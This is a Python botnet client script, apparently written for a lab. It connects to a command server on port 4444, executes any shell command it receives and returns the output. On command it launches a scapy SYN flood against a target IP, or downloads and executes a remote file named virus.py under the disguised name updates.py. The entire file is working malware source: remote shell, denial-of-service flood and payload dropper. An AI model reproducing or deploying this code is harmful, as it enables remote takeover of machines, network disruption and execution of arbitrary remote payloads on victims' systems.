#!/usr/bin/python3

import socket
import os
from scapy.all import *
import requests
import urllib.request

#client_ip = socket.gethostbyname(socket.gethostname())
client_ip_2 = socket.gethostname()
class client:
    def __init__(self):
        self.host = '192.168.176.130'
        self.port = 4444
        self.server = socket.socket()

    def connect(self):
        self.server.connect((self.host,self.port))

    def send(self,text):
        self.server.send(str(text).encode('UTF-8'))

    def recv(self):
        self.msg = self.server.recv(20400)
        return self.msg.decode('UTF-8')

class operate:
    def __init__(self):
        self.serv = client()
        self.serv.connect()

    def hack(self):
        self.serv.send('{0} @ {1}>'.format(client_ip_2,str(os.getcwd())))
        self.msg = self.serv.recv()

        if self.msg.split(' ')[0] == 'open':
            for i in range(int(self.msg.split(' ')[1])):
                data = os.popen('x-www-browser')

        elif self.msg == 'ddos':
#            exec(open("ddos.py").read(), globals())
#            data = "Done"
             target_ip = "192.168.176.135"
             target_port = 80
             ip = IP(dst=target_ip)
             tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
             raw = Raw(b"X"*1024)
             p = ip / tcp / raw
             self.serv.send('\nDDOS Attack Successfully Launched...\n')
             send(p, loop=1, verbose=0)
             data = os.popen(self.msg)
             self.serv.send(str(data.read()))



        elif self.msg == 'downloader':
#            exec(open("downloader.py").read(), globals())
             url = "http://192.168.176.135/virus.py"
             urllib.request.urlretrieve(url, 'updates.py')
             os.chmod("updates.py", 755)
             exec(open("updates.py").read(), globals())
             self.serv.send('Done\n'+str(data.read()))

        else:
            data = os.popen(self.msg)
            self.serv.send('Done\n'+str(data.read()))

def main():
    run = True
    bot = operate()
    while run:
        bot.hack()

if __name__ == '__main__':
    main()
